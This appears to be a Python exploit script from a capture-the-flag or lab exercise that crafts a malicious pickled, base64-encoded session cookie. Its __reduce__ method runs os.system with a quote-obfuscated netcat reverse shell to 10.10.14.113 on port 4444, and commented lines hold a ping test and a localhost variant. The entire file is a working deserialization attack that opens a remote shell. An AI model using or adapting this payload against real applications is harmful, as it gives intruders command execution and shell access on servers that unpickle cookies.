import pickle
import base64
import os
import util.auth

class RCE:
    def __reduce__(self):
        # return os.system, ("ping -c 5 10.10.14.113",)
        # return os.system, ("n'c' -nv 127.0.0.1 4444 -e /bin/s'h'",) # OK, No Problem
        return os.system, ("n'c' -nv 10.10.14.113 4444 -e /bin/s'h'",)

r = RCE()
cookie = pickle.dumps(r) # serialize the object
cookie = base64.b64encode(cookie) # encode to base64
cookie = cookie.decode() # convert bytes to string
print(f"cookie ---> {cookie}") 

# util.auth.cookieToSession(cookie) # Local Testing